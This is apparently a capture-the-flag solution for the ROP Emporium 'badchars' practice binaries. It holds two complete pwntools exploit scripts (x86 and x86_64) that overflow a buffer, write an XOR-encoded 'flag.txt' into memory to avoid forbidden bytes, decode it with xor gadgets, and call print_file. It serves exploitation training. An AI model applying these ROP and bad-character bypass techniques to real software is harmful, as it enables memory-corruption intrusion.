- x86


Binary : [badchars x86](https://github.com/w31rdr4v3n/Binary-Exploitation/raw/main/ROP/data/ropemporium/badchars32.zip)

My exploit:

```py
from pwn import *


sh = process("./badchars32")
print(sh.recv().decode())

rop = b"A"*44
rop += p32(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
rop += b"bhec"         # "flag" ^ 4
rop += p32(0x0804a018) # .data
rop += b"bbbb"
rop += p32(0x0804854f) # mov dword ptr [edi], esi ; ret

rop += p32(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
rop += b"*p|p"         # ".txt" ^ 4
rop += p32(0x0804a018 + 4) # .data
rop += b"bbbb"
rop += p32(0x0804854f) # mov dword ptr [edi], esi ; ret

# Again badchars

for pin in range(8):
	rop += p32(0x0804839d) # pop ebx ; ret
	rop += p32(4)
	rop += p32(0x080485bb) # pop ebp ; ret
	rop += p32(0x0804a018 + pin) # .data
	rop += p32(0x08048547) # xor byte ptr [ebp], bl ; ret

# Call Function print_file

rop += p32(0x080483d0) # print_file
rop += b"AAAA"
rop += p32(0x0804a018) # .data


sh.sendline(rop)
sh.interactive()
```

- x86_64

Binary : [badchars x86_64](https://github.com/w31rdr4v3n/Binary-Exploitation/raw/main/ROP/data/ropemporium/badchars.zip)

My exploit:

```py
from pwn import *


sh = process("./badchars")

print(sh.recv().decode())

rop = b"A"*40
rop += p64(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
rop += b"bhec*p|p"
rop += p64(0x00601038)         # .bss
rop += b"A"*8
rop += b"A"*8
rop += p64(0x0000000000400634) # mov QWORD PTR [r13+0x0],r12

# Xored

for pin in range(8):
	rop += p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
	rop += p64(4)
	rop += p64(0x00601038 + pin ) # .bss
	rop += p64(0x0000000000400628) # xor byte ptr [r15], r14b ; ret

# Call print_file

rop += p64(0x00000000004006a3) # pop rdi ; ret
rop += p64(0x00601038) # .bss
rop += p64(0x00400510) # print_file


sh.sendline(rop)

sh.interactive()
```

Challenge : https://ropemporium.com/
